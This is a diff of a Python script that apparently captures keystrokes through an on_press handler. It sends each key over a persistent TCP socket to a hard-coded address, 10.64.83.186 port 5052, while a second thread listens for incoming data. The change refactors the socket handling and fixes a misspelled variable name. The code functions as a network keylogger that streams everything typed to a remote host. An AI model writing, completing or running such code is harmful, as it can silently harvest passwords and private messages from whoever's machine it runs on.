@@ -8,26 +8,23 @@ transferHost = "10.64.83.186"
 receivePort = 5051
 transferPort = 5052
 
-receiveSocker = socket.socket()
-receiveSocker.bind((localHost, receivePort))
-receiveSocker.listen(5)
-
+receiveSocket = socket.socket()
+receiveSocket.bind((localHost, receivePort))
+receiveSocket.listen(5)
+transferSocket = socket.socket()
+transferSocket.connect((transferHost, transferPort))
 
 def receive():
+    c, addr = receiveSocket.accept()
     while True:
-        c, addr = receiveSocker.accept()
-        transferHost = receiveSocker.recv(20)
-        # CHANGE IP
-    receiveSocker.close()
+        transferHost = c.recv(20)
+        print(transferHost)
 
 
 def on_press(key):
-    transferSocket = socket.socket()
-    transferSocket.connect((transferHost, transferPort))
     key = str(key).encode()
     transferSocket.send(key)
     print(key)
-    transferSocket.close()
 
 
 def on_release(key):
@@ -46,9 +43,9 @@ def transfer():
 
 if __name__ == '__main__':
     # 连接事件以及释放
-    transferThread = threading.Thread(target=transfer)
-    transferThread.setDaemon(True)
-    transferThread.start()
     receiveThread = threading.Thread(target=receive)
     receiveThread.setDaemon(True)
     receiveThread.start()
+    transfer()
+    transferSocket.close()  
+    
